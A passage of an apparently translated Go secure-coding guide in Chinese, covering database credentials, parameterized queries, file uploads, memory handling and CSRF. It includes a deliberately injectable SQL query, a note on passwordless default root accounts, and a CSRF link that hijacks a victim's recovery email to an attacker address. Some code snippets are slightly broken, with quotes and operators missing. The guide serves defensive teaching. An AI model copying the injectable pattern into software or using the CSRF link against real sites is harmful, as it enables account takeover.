\u8bfb\u53d6\u6587\u4ef6\u540e\uff0c\u8fde\u63a5\u6570\u636e\u5e93\uff1a db, _ := sql.Open(serverDB, userDB, passDB) \u5f53\u7136\uff0c\u5982\u679c\u653b\u51fb\u8005\u5177\u6709root\u8bbf\u95ee\u6743\u9650\uff0c\u4ed6\u5c31\u53ef\u4ee5\u770b\u5230\u8be5\u6587\u4ef6\u3002\u8fd9\u5c31\u5f15\u51fa\u4e86\u4f60\u80fd\u505a\u7684\u6700\u8c28\u614e\u7684\u4e8b\u60c5--\u52a0\u5bc6\u6587\u4ef6\u3002 \u6570\u636e\u5e93\u8bc1\u4e66 \u4f60\u5e94\u8be5\u4e3a\u6bcf\u4e2a\u4fe1\u4efb\u533a\u5757\u548c\u7ea7\u522b\u4f7f\u7528\u4e0d\u540c\u7684\u51ed\u636e: \u7528\u6237 \u53ea\u8bfb\u7528\u6237 \u5ba2\u4eba \u7ba1\u7406 \u8fd9\u6837\uff0c\u5982\u679c\u8fde\u63a5\u662f\u4e3a\u53ea\u8bfb\u7528\u6237\u5efa\u7acb\u7684\uff0c\u4ed6\u4eec\u5c31\u6c38\u8fdc\u4e0d\u4f1a\u7834\u574f\u6570\u636e\u5e93\u4fe1\u606f\uff0c\u56e0\u4e3a\u8fd9\u4e9b\u7528\u6237\u5b9e\u9645\u4e0a\u53ea\u80fd\u8bfb\u53d6\u6570\u636e\u3002 \u6570\u636e\u5e93\u8ba4\u8bc1 \u4ee5\u6700\u5c0f\u6743\u9650\u8bbf\u95ee\u6570\u636e\u5e93 \u5982\u679c\u60a8\u7684Go web\u5e94\u7528\u7a0b\u5e8f\u53ea\u9700\u8981\u8bfb\u53d6\u6570\u636e\u800c\u4e0d\u9700\u8981\u5199\u5165\u4fe1\u606f\uff0c\u90a3\u4e48\u521b\u5efa\u4e00\u4e2a\u6743\u9650\u4e3a\u53ea\u8bfb\u7684\u6570\u636e\u5e93\u7528\u6237\u3002\u59cb\u7ec8\u6839\u636eweb\u5e94\u7528\u7a0b\u5e8f\u7684\u9700\u8981\u8c03\u6574\u6570\u636e\u5e93\u7528\u6237\u3002 \u4f7f\u7528\u5f3a\u5bc6\u7801 \u521b\u5efa\u6570\u636e\u5e93\u8bbf\u95ee\u6743\u9650\u65f6\uff0c\u8bf7\u9009\u62e9\u5f3a\u5bc6\u7801\u3002\u60a8\u53ef\u4ee5\u4f7f\u7528\u5bc6\u7801\u7ba1\u7406\u5668\u6765\u751f\u6210\u5f3a\u5bc6\u7801\uff0c\u6216\u8005\u4f7f\u7528\u4e3a\u4f60\u6267\u884c\u76f8\u540c\u64cd\u4f5c\u7684\u5728\u7ebfWeb\u5e94\u7528\u7a0b\u5e8f - \u5f3a\u5bc6\u7801\u751f\u6210\u5668 \u3002 \u5220\u9664\u9ed8\u8ba4\u7684\u7ba1\u7406\u5bc6\u7801 \u5927\u591a\u6570DBS\u90fd\u6709\u9ed8\u8ba4\u5e10\u6237\uff0c\u5176\u4e2d\u5927\u90e8\u5206\u90fd\u6ca1\u6709\u6700\u9ad8\u6743\u9650\u7528\u6237\u7684\u5bc6\u7801\u3002 MariaDB\uff0cMongoDB - root /\u65e0\u5bc6\u7801 \u8fd9\u610f\u5473\u7740\u5982\u679c\u6ca1\u6709\u5bc6\u7801\uff0c\u653b\u51fb\u8005\u5c31\u53ef\u4ee5\u8bbf\u95ee\u6240\u6709\u5185\u5bb9\u3002 \u6b64\u5916\uff0c\u5982\u679c\u4f60\u8981\u5c06\u4ee3\u7801\u53d1\u5e03\u5728Github\u7684\u53ef\u516c\u5f00\u8bbf\u95ee\u7684\u5b58\u50a8\u5e93\u4e2d\uff0c\u8bf7\u4e0d\u8981\u5fd8\u8bb0\u5220\u9664\u60a8\u7684\u51ed\u636e\u6216\u79c1\u94a5\u3002 \u53c2\u6570\u5316\u67e5\u8be2 \u9884\u5148\u51c6\u5907\u597d\u7684\u67e5\u8be2\u8bed\u53e5(\u5e26\u6709\u53c2\u6570\u5316\u67e5\u8be2)\u662f\u9632\u6b62SQL\u6ce8\u5165\u7684\u6700\u4f73\u548c\u6700\u5b89\u5168\u7684\u65b9\u6cd5\u3002 \u5728\u67d0\u4e9b\u62a5\u544a\u7684\u60c5\u51b5\u4e0b\uff0c\u9884\u5148\u51c6\u5907\u597d\u7684\u8bed\u53e5\u53ef\u80fd\u4f1a\u6709\u635fweb\u5e94\u7528\u7a0b\u5e8f\u7684\u6027\u80fd\u3002\u56e0\u6b64\uff0c\u5982\u679c\u51fa\u4e8e\u67d0\u79cd\u539f\u56e0\u9700\u8981\u505c\u6b62\u4f7f\u7528\u8fd9\u79cd\u7c7b\u578b\u7684\u6570\u636e\u5e93\u67e5\u8be2\uff0c\u6211\u4eec\u5f3a\u70c8\u5efa\u8bae\u9605\u8bfb \u8f93\u5165\u9a8c\u8bc1 \u548c \u8f93\u51fa\u7f16\u7801 \u90e8\u5206\u3002 Go\u4e0e\u5176\u4ed6\u8bed\u8a00\u7684\u5e38\u7528\u9884\u51c6\u5907\u8bed\u53e5\u7684\u5de5\u4f5c\u65b9\u5f0f\u4e0d\u540c - \u4f60\u4e0d\u9700\u8981\u5728\u8fde\u63a5\u4e0a\u51c6\u5907\u8bed\u53e5\uff0c \u800c\u5728DB\u4e0a\u51c6\u5907\u3002 \u793a\u4f8b \u5f00\u53d1\u4eba\u5458\u5728\u8fde\u63a5\u6c60\u4e2d\u7684\u4e00\u4e2a\u8fde\u63a5\u4e0a\u51c6\u5907\u8bed\u53e5(Stmt) Stmt\u5bf9\u8c61\u4f1a\u8bb0\u4f4f\u4f7f\u7528\u4e86\u54ea\u4e2a\u8fde\u63a5 \u5f53\u5e94\u7528\u7a0b\u5e8f\u6267\u884cStmt\u65f6\uff0c\u5b83\u5c1d\u8bd5\u4f7f\u7528\u8be5\u8fde\u63a5\u3002\u5982\u679c\u5b83\u4e0d\u53ef\u7528\uff0c\u5b83\u5c06\u5c1d\u8bd5\u5728\u6c60\u4e2d\u627e\u5230\u53e6\u4e00\u4e2a\u8fde\u63a5 \u8fd9\u79cd\u7c7b\u578b\u7684\u6d41\u53ef\u80fd\u5bfc\u81f4\u6570\u636e\u5e93\u7684\u9ad8\u5e76\u53d1\u6027\u4f7f\u7528\uff0c\u5e76\u521b\u5efa\u5927\u91cf\u9884\u51c6\u5907\u7684\u8bed\u53e5\u3002\u6240\u4ee5\uff0c\u8bb0\u4f4f\u8fd9\u4e9b\u4fe1\u606f\u975e\u5e38\u91cd\u8981\u3002 \u4ee5\u4e0b\u662f\u5e26\u53c2\u6570\u5316\u67e5\u8be2\u7684\u9884\u51c6\u5907\u8bed\u53e5\u7684\u793a\u4f8b\uff1a customerName := r.URL.Query().Get( name ) db.Exec( UPDATE creditcards SET name=? WHERE customerId=? , customerName, 233, 90) \u6709\u65f6\u5019\uff0c\u51c6\u5907\u597d\u7684\u8bed\u53e5\u4e0d\u662f\u4f60\u60f3\u8981\u7684\u3002\u8fd9\u53ef\u80fd\u6709\u51e0\u4e2a\u539f\u56e0\uff1a \u6570\u636e\u5e93\u4e0d\u652f\u6301\u9884\u51c6\u5907\u8bed\u53e5\u3002\u4f8b\u5982\uff0c\u5728\u4f7f\u7528MySQL\u9a71\u52a8\u7a0b\u5e8f\u65f6\uff0c\u53ef\u4ee5\u8fde\u63a5\u5230MemSQL\u548cSphinx\uff0c\u56e0\u4e3a\u5b83\u4eec\u652f\u6301MySQL \u6709\u7ebf\u534f\u8bae\u3002\u4f46\u662f\u5b83\u4eec\u4e0d\u652f\u6301\u5305\u542b\u9884\u51c6\u5907\u8bed\u53e5\u7684\u201c\u4e8c\u8fdb\u5236\u201d\u534f\u8bae\uff0c\u56e0\u6b64\u5b83\u4eec\u53ef\u80fd\u4f1a\u4ee5\u4ee4\u4eba\u56f0\u60d1\u7684\u65b9\u5f0f\u5931\u8d25\u3002 \u8fd9\u4e9b\u8bed\u53e5\u7684\u91cd\u7528\u6027\u4e0d\u8db3\u4ee5\u4f7f\u5b83\u4eec\u53d8\u5f97\u6709\u4ef7\u503c\uff0c\u5e76\u4e14\u5b89\u5168\u95ee\u9898\u5728\u6211\u4eec\u7684\u5e94\u7528\u7a0b\u5e8f\u5806\u6808\u7684\u53e6\u4e00\u5c42\u5904\u7406\uff08\u8bf7\u53c2\u9605\uff1a \u8f93\u5165\u9a8c\u8bc1 \u548c \u8f93\u51fa\u7f16\u7801 \uff0c\u56e0\u6b64\u4e0a\u9762\u6240\u793a\u7684\u6027\u80fd\u662f\u4e0d\u53ef\u53d6\u7684\u3002 \u5b58\u50a8\u8fc7\u7a0b \u5f00\u53d1\u4eba\u5458\u53ef\u4ee5\u4f7f\u7528\u5b58\u50a8\u8fc7\u7a0b\u521b\u5efa\u67e5\u8be2\u7684\u7279\u5b9a\u89c6\u56fe\uff0c\u4ee5\u9632\u6b62\u654f\u611f\u4fe1\u606f\u88ab\u5f52\u6863\uff0c\u800c\u4e0d\u662f\u4f7f\u7528\u666e\u901a\u67e5\u8be2\u3002 \u5f00\u53d1\u4eba\u5458\u53ef\u4ee5\u6dfb\u52a0\u4e00\u4e2a\u63a5\u53e3\uff0c\u901a\u8fc7\u521b\u5efa\u548c\u9650\u5236\u5bf9\u5b58\u50a8\u8fc7\u7a0b\u7684\u8bbf\u95ee\uff0c\u5c06\u4e00\u4e2a\u4eba\u4f7f\u7528\u7279\u5b9a\u5b58\u50a8\u8fc7\u7a0b\u548c\u53ef\u4ee5\u8bbf\u95ee\u7684\u4fe1\u606f\u7c7b\u578b\u533a\u5206\u5f00\u6765\u3002\u4f7f\u7528\u6b64\u529f\u80fd\uff0c\u5f00\u53d1\u4eba\u5458\u53ef\u4ee5\u66f4\u5bb9\u6613\u5730\u7ba1\u7406\u8be5\u8fc7\u7a0b\uff0c\u7279\u522b\u662f\u5728\u4ece\u5b89\u5168\u89d2\u5ea6\u63a7\u5236\u8868\u548c\u5217\u65f6\uff0c\u975e\u5e38\u65b9\u4fbf\u3002 \u8ba9\u6211\u4eec\u6765\u770b\u4e00\u4e2a\u4f8b\u5b50\u2026\u2026 \u5047\u8bbe\u4f60\u6709\u4e00\u4e2a\u8868\uff0c\u5176\u4e2d\u5305\u542b\u5173\u4e8e\u7528\u6237\u62a4\u7167ID\u7684\u4fe1\u606f\u3002 \u4f7f\u7528\u5982\u4e0b\u67e5\u8be2: SELECT * FROM tblUsers WHERE userId = $user_input \u9664\u4e86\u8f93\u5165\u9a8c\u8bc1\u7684\u95ee\u9898\u4e4b\u5916\uff0c\u6570\u636e\u5e93\u7528\u6237(\u5728\u672c\u4f8b\u4e2d\uff0c\u7528\u6237\u540d\u4e3aJohn)\u8fd8\u53ef\u4ee5\u901a\u8fc7\u7528\u6237ID\u8bbf\u95ee\u6240\u6709\u4fe1\u606f\u3002 \u5982\u679cJohn\u53ea\u80fd\u4f7f\u7528\u8fd9\u4e2a\u5b58\u50a8\u8fc7\u7a0b\u4f1a\u600e\u6837\uff1a CREATE PROCEDURE db.getName @userId int = NULL AS SELECT name, lastname FROM tblUsers WHERE userId = @userId GO \u4f60\u53ea\u9700\u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4\u5373\u53ef\u8fd0\u884c\uff1a EXEC db.getName @userId = 14 \u901a\u8fc7\u8fd9\u79cd\u65b9\u5f0f\uff0c\u4f60\u53ef\u4ee5\u786e\u5b9a\u7528\u6237John\u53ea\u770b\u5230\u4ed6\u8bf7\u6c42\u7684\u7528\u6237\u7684 name \u548c lastname \u3002 \u5b58\u50a8\u8fc7\u7a0b\u5e76\u4e0d\u662f\u65e0\u61c8\u53ef\u51fb\u7684\uff0c\u4f46\u662f\u5b83\u4e3a\u4f60\u7684web\u5e94\u7528\u7a0b\u5e8f\u521b\u5efa\u4e86\u4e00\u4e2a\u65b0\u7684\u4fdd\u62a4\u5c42\u3002\u5b58\u50a8\u8fc7\u7a0b\u4e3aDBA\u5728\u63a7\u5236\u6743\u9650\u65b9\u9762\u63d0\u4f9b\u4e86\u5f88\u5927\u7684\u4f18\u52bf(\u4f8b\u5982\uff0c\u7528\u6237\u53ef\u4ee5\u9650\u4e8e\u7279\u5b9a\u7684\u884c/\u6570\u636e)\uff0c\u751a\u81f3\u66f4\u597d\u7684\u670d\u52a1\u5668\u6027\u80fd\u3002 \u6587\u4ef6\u7ba1\u7406 \u5904\u7406\u6587\u4ef6\u65f6\u8981\u91c7\u53d6\u7684\u7b2c\u4e00\u4e2a\u9884\u9632\u63aa\u65bd\u662f\uff0c\u786e\u4fdd\u4e0d\u5141\u8bb8\u7528\u6237\u76f4\u63a5\u5411\u4efb\u4f55\u52a8\u6001\u51fd\u6570\u63d0\u4f9b\u6570\u636e\u3002\u5728PHP\u7b49\u8bed\u8a00\u4e2d\uff0c\u5c06\u7528\u6237\u6570\u636e\u4f20\u9012\u7ed9\u52a8\u6001\u52a0\u8f7d\u51fd\u6570\u662f\u4e00\u4e2a\u4e25\u91cd\u7684\u5b89\u5168\u98ce\u9669\u3002Go\u662f\u4e00\u79cd\u7f16\u8bd1\u8bed\u8a00\uff0c\u8fd9\u610f\u5473\u7740\u4e0d\u4f1a include \u51fd\u6570\uff0c\u800c\u4e14\u901a\u5e38\u4e0d\u4f1a\u52a8\u6001\u52a0\u8f7d\u5e93\u3002 Go 1.8\u7248\u672c\uff0c\u5141\u8bb8\u901a\u8fc7\u65b0\u7684\u63d2\u4ef6\u673a\u5236\u6765\u5b9e\u73b0\u52a8\u6001\u52a0\u8f7d\u3002\u5982\u679c\u4f60\u7684\u5e94\u7528\u7a0b\u5e8f\u4f7f\u7528\u8fd9\u79cd\u673a\u5236\uff0c\u5e94\u8be5\u5bf9\u7528\u6237\u63d0\u4f9b\u7684\u8f93\u5165\u91c7\u53d6\u9884\u9632\u63aa\u65bd\u3002 \u6587\u4ef6\u4e0a\u4f20\u5e94\u8be5\u4ec5\u9650\u4e8e\u7ecf\u8fc7\u8eab\u4efd\u9a8c\u8bc1\u7684\u7528\u6237\u3002\u5728\u786e\u4fdd\u6587\u4ef6\u4e0a\u4f20\u4ec5\u80fd\u7531\u7ecf\u8fc7\u8eab\u4efd\u9a8c\u8bc1\u7684\u7528\u6237\u5b8c\u6210\u4e4b\u540e\uff0c\u5b89\u5168\u6027\u7684\u53e6\u4e00\u4e2a\u91cd\u8981\u65b9\u9762\u662f\uff0c\u786e\u4fdd\u53ea\u6709\u767d\u540d\u5355\u4e2d\u7684\u6587\u4ef6\u7c7b\u578b\u624d\u80fd\u4e0a\u4f20\u5230\u670d\u52a1\u5668\u3002\u53ef\u4ee5\u4f7f\u7528\u4ee5\u4e0b\u68c0\u6d4bMIME\u7c7b\u578b\u7684Go\u51fd\u6570\u8fdb\u884c\u6b64\u68c0\u67e5\uff1a func DetectContentType(data []byte) string \u9644\u52a0\u4e86\u4e00\u4e2a\u8bfb\u53d6\u6587\u4ef6\u5e76\u8bc6\u522b\u5176MIME\u7c7b\u578b\u7684\u7b80\u5355\u7a0b\u5e8f\u3002\u6700\u76f8\u5173\u7684\u90e8\u5206\u5982\u4e0b\uff1a {...} // Write our file to a buffer // Why 512 bytes? See http://golang.org/pkg/net/http/#DetectContentType buff := make([]byte, 512) _, err = file.Read(buff) {...} //Result - Our detected filetype filetype := http.DetectContentType(buff) \u5728\u8bc6\u522b\u6587\u4ef6\u7c7b\u578b\u4e4b\u540e\uff0c\u6839\u636e\u5141\u8bb8\u7684\u6587\u4ef6\u7c7b\u578b\u7684\u767d\u540d\u5355\uff0c\u9a8c\u8bc1\u6587\u4ef6\u7c7b\u578b\u3002 \u5728\u8be5\u793a\u4f8b\u4e2d\uff0c\u8fd9\u5728\u4ee5\u4e0b\u90e8\u5206\u4e2d\u5b9e\u73b0\uff1a {...} switch filetype { case image/jpeg , image/jpg : fmt.Println(filetype) case image/gif : fmt.Println(filetype) case image/png : fmt.Println(filetype) default: fmt.Println( unknown file type uploaded ) } {...} \u7528\u6237\u4e0a\u4f20\u7684\u6587\u4ef6\u4e0d\u5e94\u8be5\u5b58\u50a8\u5728\u5e94\u7528\u7a0b\u5e8f\u7684Web\u4e0a\u4e0b\u6587\u4e2d\u3002\u76f8\u53cd\uff0c\u6587\u4ef6\u5e94\u8be5\u5b58\u50a8\u5728\u5185\u5bb9\u670d\u52a1\u5668\u6216\u6570\u636e\u5e93\u4e2d\u3002\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u6240\u9009\u7684\u6587\u4ef6\u4e0a\u4f20\u8def\u5f84\u4e0d\u5177\u6709\u6267\u884c\u6743\u9650\u3002 \u5982\u679c\u627f\u8f7d\u7528\u6237\u4e0a\u4f20\u7684\u6587\u4ef6\u670d\u52a1\u5668\u57fa\u4e8e *NIX \uff0c\u8bf7\u786e\u4fdd\u5b9e\u73b0chrooted\u73af\u5883\u7b49\u5b89\u5168\u673a\u5236\uff0c\u6216\u5c06\u76ee\u6807\u6587\u4ef6\u76ee\u5f55\u6302\u8f7d\u4e3a\u903b\u8f91\u9a71\u52a8\u5668\u3002 \u540c\u6837\uff0c\u7531\u4e8eGo\u662f\u4e00\u79cd\u7f16\u8bd1\u8bed\u8a00\uff0c\u56e0\u6b64\u4e0d\u5b58\u5728\u4e0a\u4f20\u5305\u542b\u53ef\u5728\u670d\u52a1\u5668\u7aef\u89e3\u91ca\u7684\u6076\u610f\u4ee3\u7801\u7684\u6587\u4ef6\u7684\u5e38\u89c1\u98ce\u9669\u3002 \u5728\u52a8\u6001\u91cd\u5b9a\u5411\u7684\u60c5\u51b5\u4e0b\uff0c\u4e0d\u5e94\u8be5\u4f20\u9012\u7528\u6237\u6570\u636e\u3002\u5982\u679c\u4f60\u7684\u5e94\u7528\u7a0b\u5e8f\u9700\u8981\u5b83\uff0c\u5219\u5fc5\u987b\u91c7\u53d6\u5176\u4ed6\u63aa\u65bd\u6765\u786e\u4fdd\u5e94\u7528\u7a0b\u5e8f\u7684\u5b89\u5168\u6027\u3002\u8fd9\u4e9b\u68c0\u67e5\u5305\u62ec\u53ea\u63a5\u53d7\u6b63\u786e\u9a8c\u8bc1\u7684\u6570\u636e\u548c\u76f8\u5bf9\u8def\u5f84url\u3002 \u6b64\u5916\uff0c\u5728\u5c06\u6570\u636e\u4f20\u9012\u5230\u52a8\u6001\u91cd\u5b9a\u5411\u65f6\uff0c\u4e00\u5b9a\u8981\u786e\u4fdd\u76ee\u5f55\u548c\u6587\u4ef6\u8def\u5f84\u6620\u5c04\u5230\u9884\u5b9a\u4e49\u7684\u8def\u5f84\u5217\u8868\u7684\u7d22\u5f15\uff0c\u5e76\u4f7f\u7528\u8fd9\u4e9b\u7d22\u5f15\u3002 \u6c38\u8fdc\u4e0d\u8981\u5c06\u7edd\u5bf9\u6587\u4ef6\u8def\u5f84\u53d1\u9001\u7ed9\u7528\u6237\uff0c\u59cb\u7ec8\u4f7f\u7528\u76f8\u5bf9\u8def\u5f84\u3002 \u5c06\u6709\u5173\u5e94\u7528\u7a0b\u5e8f\u6587\u4ef6\u548c\u8d44\u6e90\u7684\u670d\u52a1\u5668\u6743\u9650\u8bbe\u7f6e\u4e3a\u53ea\u8bfb\uff0c\u5f53\u4e0a\u4f20\u6587\u4ef6\u65f6\uff0c\u626b\u63cf\u8be5\u6587\u4ef6\uff0c\u67e5\u627e\u75c5\u6bd2\u548c\u6076\u610f\u8f6f\u4ef6\u3002 \u5185\u5b58\u7ba1\u7406 \u5173\u4e8e\u5185\u5b58\u7ba1\u7406\uff0c\u6709\u51e0\u4e2a\u91cd\u8981\u65b9\u9762\u9700\u8981\u8003\u8651\u3002\u9075\u5faaOWASP\u6307\u5357\uff0c\u6211\u4eec\u5fc5\u987b\u91c7\u53d6\u7684\u4fdd\u62a4\u5e94\u7528\u7a0b\u5e8f\u63aa\u65bd\u7684\u7b2c\u4e00\u6b65\uff0c\u662f\u68c0\u67e5\u7528\u6237\u7684\u8f93\u5165/\u8f93\u51fa\u3002\u8fd9\u4e9b\u63aa\u65bd\u9700\u786e\u4fdd\u4e0d\u5141\u8bb8\u4efb\u4f55\u6076\u610f\u5185\u5bb9\u3002\u6709\u5173\u6b64\u65b9\u9762\u7684\u66f4\u8be6\u7ec6\u6982\u8ff0\uff0c\u8bf7\u53c2\u9605\u672c\u6587\u6863\u7684 \u8f93\u5165\u9a8c\u8bc1 \u548c \u8f93\u51fa\u7f16\u7801 \u90e8\u5206\u3002 \u5173\u4e8e\u5185\u5b58\u7ba1\u7406\u7684\u53e6\u4e00\u4e2a\u91cd\u8981\u65b9\u9762\u662f\u7f13\u51b2\u533a\u8fb9\u754c\u68c0\u67e5\u3002\u5728\u5904\u7406\u63a5\u53d7\u5927\u91cf\u5b57\u8282\u8fdb\u884c\u590d\u5236\u7684\u51fd\u6570\u65f6\uff0c\u901a\u5e38\u5728c\u98ce\u683c\u7684\u8bed\u8a00\u4e2d\uff0c\u5fc5\u987b\u68c0\u67e5\u76ee\u6807\u6570\u7ec4\u7684\u5927\u5c0f\uff0c\u4ee5\u786e\u4fdd\u5199\u5165\u7684\u5185\u5bb9\u4e0d\u4f1a\u8d85\u8fc7\u5206\u914d\u7684\u7a7a\u95f4\u3002\u5728Go\u4e2d\uff0c String \u7b49\u6570\u636e\u7c7b\u578b\u4e0d\u4ee5 NULL \u7ed3\u5c3e\uff0c\u5bf9\u4e8eString\uff0c\u5176 header \u5305\u542b\u4ee5\u4e0b\u4fe1\u606f\uff1a type StringHeader struct { Data uintptr Len int } \u5c3d\u7ba1\u5982\u6b64\uff0c\u5fc5\u987b\u8fdb\u884c\u8fb9\u754c\u68c0\u67e5\uff08\u4f8b\u5982\u5728\u5faa\u73af\u65f6\uff09\u3002\u5982\u679c\u6211\u4eec\u8d85\u51fa\u4e86\u8bbe\u5b9a\u7684\u754c\u9650\uff0cgo\u4f1a\u629b\u51fa Panic \u3002 \u4e00\u4e2a\u7b80\u5355\u7684\u4f8b\u5b50\uff1a func main() { strings := []string{ aaa , bbb , ccc , ddd } // Our loop is not checking the MAP length - BAD for i := 0; i 5; i++ { if len(strings[i]) 0 { fmt.Println(strings[i]) } } } \u8f93\u51fa\uff1a aaa bbb ccc ddd panic: runtime error: index out of range \u5f53\u6211\u4eec\u7684\u5e94\u7528\u7a0b\u5e8f\u4f7f\u7528\u8d44\u6e90\u65f6\uff0c\u8fd8\u5fc5\u987b\u8fdb\u884c\u989d\u5916\u7684\u68c0\u67e5\uff0c\u4ee5\u786e\u4fdd\u5b83\u4eec\u5df2\u7ecf\u5173\u95ed\uff0c\u800c\u4e0d\u4ec5\u4ec5\u662f\u4f9d\u8d56\u4e8e\u5783\u573e\u6536\u96c6\u5668\u3002\u8fd9\u9002\u7528\u4e8e\u5904\u7406\u8fde\u63a5\u5bf9\u8c61\u3001\u6587\u4ef6\u53e5\u67c4\u7b49\u3002\u5728Go\u4e2d\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 Defer \u6765\u6267\u884c\u8fd9\u4e9b\u64cd\u4f5c\u3002 Defer \u4e2d\u7684\u6307\u4ee4\u53ea\u5728\u5468\u56f4\u51fd\u6570\u6267\u884c\u5b8c\u6210\u65f6\u6267\u884c\u3002 defer func() { // Our cleanup code here } \u6709\u5173 Defer \u7684\u66f4\u591a\u4fe1\u606f\u53ef\u4ee5\u5728\u6587\u6863\u7684 \u9519\u8bef\u5904\u7406 \u90e8\u5206\u4e2d\u627e\u5230\u3002 \u8fd8\u5e94\u907f\u514d\u4f7f\u7528\u5df2\u77e5\u7684\u6613\u53d7\u653b\u51fb\u7684\u51fd\u6570\u3002\u5728Go\u4e2d\uff0c Unsafe \u5305\u4e2d\u5305\u542b\u8fd9\u4e9b\u51fd\u6570\u3002 \u8fd9\u4e9b\u51fd\u6570\u4e0d\u5e94\u8be5\u7528\u4e8e\u751f\u4ea7\u73af\u5883\uff0c\u5728\u5305\u4e2d\u4e5f\u4e0d\u5e94\u8be5\u4f7f\u7528\uff0c\u5305\u62ec Testing \u5305\u3002 \u53e6\u4e00\u65b9\u9762\uff0c\u5185\u5b58\u56de\u6536\u662f\u7531\u5783\u573e\u6536\u96c6\u5668\u5904\u7406\u7684\uff0c\u8fd9\u610f\u5473\u7740\u6211\u4eec\u4e0d\u5fc5\u62c5\u5fc3\u5b83\u3002\u6709\u8da3\u662f\uff0c\u624b\u52a8\u91ca\u653e\u5185\u5b58\u662f\u53ef\u80fd\u7684\uff0c\u5c3d\u7ba1\u4e0d\u5efa\u8bae\u8fd9\u6837\u505a\u3002 \u5f15\u7528 Golang Github \uff1a \u5982\u679c\u60a8\u771f\u7684\u60f3\u4f7f\u7528Go\u624b\u52a8\u7ba1\u7406\u5185\u5b58\uff0c\u8bf7\u57fa\u4e8e syscall.Mma \u6216 cgo malloc/free \u5b9e\u73b0\u4f60\u81ea\u5df1\u7684\u5185\u5b58\u5206\u914d\u5668\u3002 \u5bf9\u4e8e\u50cfGo\u8fd9\u6837\u7684\u5e76\u53d1\u8bed\u8a00\uff0c\u957f\u65f6\u95f4\u7981\u7528GC\u901a\u5e38\u662f\u4e00\u4e2a\u7cdf\u7cd5\u7684\u89e3\u51b3\u65b9\u6848\u3002Go\u7684GC\u672a\u6765\u53ea\u4f1a\u66f4\u597d\u3002 \u901a\u7528\u7f16\u7801\u5b9e\u8df5 \u8de8\u7ad9\u8bf7\u6c42\u4f2a\u9020 \u6839\u636e OWASP\u7684\u5b9a\u4e49 \uff0c\"\u8de8\u7ad9\u70b9\u8bf7\u6c42\u4f2a\u9020(CSRF)\u662f\u4e00\u79cd\u653b\u51fb\uff0c\u5b83\u8feb\u4f7f\u7ec8\u7aef\u7528\u6237\u5728\u5f53\u524d\u7ecf\u8fc7\u8eab\u4efd\u9a8c\u8bc1\u7684web\u5e94\u7528\u7a0b\u5e8f\u4e0a\u6267\u884c\u4e0d\u9700\u8981\u7684\u64cd\u4f5c\u3002\" CSRF\u653b\u51fb\u7684\u76ee\u6807\u4e0d\u662f\u7a83\u53d6\u6570\u636e\uff0c\u800c\u662f\u72b6\u6001\u66f4\u6539\u8bf7\u6c42\u3002\u901a\u8fc7\u4e00\u4e9b\u793e\u4ea4\u5de5\u7a0b(\u6bd4\u5982\u901a\u8fc7\u7535\u5b50\u90ae\u4ef6\u6216\u804a\u5929\u5206\u4eab\u94fe\u63a5)\uff0c\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u6b3a\u9a97\u7528\u6237\u6267\u884c\u4e0d\u9700\u8981\u7684Web\u5e94\u7528\u7a0b\u5e8f\u64cd\u4f5c\uff0c\u6bd4\u5982\u66f4\u6539\u5e10\u6237\u7684\u6062\u590demail\u3002 \u653b\u51fb\u573a\u666f \u5047\u8bbe foo.com \u4f7f\u7528 HTTP GET \u8bf7\u6c42\u8bbe\u7f6e\u5e10\u6237\u7684\u6062\u590demail\uff1a GET https://foo.com/account/recover?email=me@somehost.com \u4e00\u4e2a\u7b80\u5355\u7684\u653b\u51fb\u573a\u666f\u53ef\u80fd\u662f\u8fd9\u6837\u7684\uff1a \u53d7\u5bb3\u8005\u901a\u8fc7 https://foo.com \u8fdb\u884c\u8eab\u4efd\u9a8c\u8bc1 \u653b\u51fb\u8005\u901a\u8fc7\u94fe\u63a5\u5411\u53d7\u5bb3\u8005\u53d1\u9001\u804a\u5929\u6d88\u606f https://foo.com/account/recover?email=me@attacker.com 3.\u53d7\u5bb3\u8005\u7684\u5e10\u6237\u6062\u590demail\u5730\u5740\u88ab\u66f4\u6539\u4e3a me@attacker.com \uff0c\u653b\u51fb\u8005\u5b8c\u5168\u63a7\u5236\u5b83 \u95ee\u9898 \u5c06HTTP\u65b9\u6cd5\u4ece GET \u66f4\u6539\u4e3a POST (\u6216\u4efb\u4f55\u5176\u4ed6)\u90fd\u4e0d\u80fd\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\uff0cURL\u91cd\u5199\u6216HTTPS\u4e5f\u4e0d\u80fd\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\u3002 \u8fd9\u4e2a\u653b\u51fb\u7684\u539f\u56e0\u662f\u56e0\u4e3a\u670d\u52a1\u5668\u4e0d\u80fd\u533a\u5206\u5408\u6cd5\u7528\u6237\u5728\u4f1a\u8bdd\u671f\u95f4\u53d1\u51fa\u7684\u8bf7\u6c42\u548c\"\u6076\u610f\"\u7684\u8bf7\u6c42\u3002 \u89e3\u51b3\u65b9\u6848 \u7406\u8bba\u4e0a \u5982\u524d\u6240\u8ff0\uff0cCSRF\u9488\u5bf9\u7684\u662f\u72b6\u6001\u66f4\u6539\u8bf7\u6c42\uff0c\u5bf9\u4e8eWeb\u5e94\u7528\u7a0b\u5e8f\uff0c\u5927\u591a\u6570\u60c5\u51b5\u4e0b\u90fd\u662f\u63d0\u4ea4\u8868\u5355\u53d1\u51fa\u7684 POST \u8bf7\u6c42\u3002 \u5728\u6b64\u573a\u666f\u4e2d\uff0c\u5f53\u9996\u6b21\u8bf7\u6c42\u5448\u73b0\u8868\u5355\u7684\u9875\u9762\u65f6\uff0c\u670d\u52a1\u5668\u8ba1\u7b97\u4e00\u4e2a \u968f\u673a\u6570 (\u6253\u7b97\u4f7f\u7528\u4e00\u6b21\u7684\u4efb\u610f\u6570\u5b57)\u3002\u7136\u540e\uff0c\u8fd9\u4e2atoken\u4f5c\u4e3a\u5b57\u6bb5\u5305\u542b\u5728\u8868\u5355\u4e2d(\u5927\u591a\u6570\u65f6\u5019\u8fd9\u4e2a\u5b57\u6bb5\u662f\u9690\u85cf\u7684\uff0c\u4f46\u4e0d\u662f\u5f3a\u5236\u6027\u7684)\u3002 